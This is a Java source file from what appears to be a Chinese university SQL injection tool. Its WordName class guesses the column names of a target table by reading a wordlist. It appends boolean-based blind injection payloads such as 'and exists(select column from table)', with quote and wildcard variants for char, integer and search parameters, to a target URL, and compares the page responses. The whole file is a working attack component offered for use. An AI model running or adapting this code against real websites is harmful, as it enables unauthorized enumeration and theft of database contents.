package cn.edu.neu.MJ.SQLInject;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

import static cn.edu.neu.HJ.GUI.GUIStart.mf;


public class WordName {
	public List<String> GuessWord(String tname, String url, String sqltype)
	{
		GetWebContent gwc=new GetWebContent();
		String head ="";
		String tail = "";
	    if(sqltype.equals("charGet")){//如果get注入为char型，url进行如下处理
	    	head="'";
	    	tail="%20and%20'1'='1";
	    	
	    }else if(sqltype.equals("intGet")){
	    	head = "";
	    	tail = "%20and%201=1";
	    }
	    else if(sqltype.equals("searchGet")){//如果get注入为搜索型，url进行如下处理
	    	    head="%'";
	    	    tail="%20and%20'%'='";
		}
		List<String> list1 = new ArrayList<String>();
		File file2 =new File("wordname.txt");
		BufferedReader bw2 = null;
		try {
			bw2 = new BufferedReader(new FileReader(file2));
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String str2 = null;
		try {
			str2 = bw2.readLine();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		while(str2!=null)
		{
		if (gwc.RepareContent(url,url+head+"%20and%20exists(select%20"+str2+"%20from%20"+tname+"%20)"+tail)){
			
			System.out.println("表"+tname+"中存在"+str2+"字段");
			mf.printSQLInjectProcess("表" + tname + "中存在" + str2 + "字段" + "\n");
			//mf.setWordNameResult("表"+tname+"中存在"+str2+"字段" + "\n");
    		list1.add(str2);	
    		}
    	try {
			str2 =bw2.readLine();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	}
    	try {
			bw2.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
     return list1;
}
}
